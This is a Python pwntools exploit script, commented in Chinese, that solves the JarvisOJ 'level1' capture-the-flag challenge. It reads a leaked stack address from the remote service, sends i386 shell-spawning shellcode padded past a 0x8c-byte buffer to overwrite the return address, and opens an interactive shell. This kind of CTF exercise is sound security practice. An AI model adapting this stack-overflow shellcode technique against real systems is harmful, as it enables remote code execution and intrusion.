'''
@Author       : 白银
@Date         : 2023-05-27 14:43:28
@LastEditors  : 白银
@LastEditTime : 2023-05-27 16:53:43
@FilePath     : /pwn/level1.py
@Description  : https://www.jarvisoj.com/challenges
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''


from pwn import *
# from libcfind import *

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './level1'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("pwn2.jarvisoj.com", 9877)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        # libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        # libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    # libc = elf.libc
    # libc = ELF('/home/jack/Desktop/libc-2.23.so')
    libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x8c # # ida看，buf和r差多少
buf_addr = int(io.recvline()[14:-2], 16) # printf("What's this:%p?\n", buf); // buf_addr位置在第12个开始，倒数第二个字符结束，但是要以小端序写16进制地址
print("buf_addr------", int(buf_addr), 16)
payload = flat([asm(shellcraft.sh()), 'a' * (padding - len(asm(shellcraft.sh()))), buf_addr]) # 此时shellcode在buf处，溢出ret2buf
print(payload)

io.sendline(payload)

io.interactive()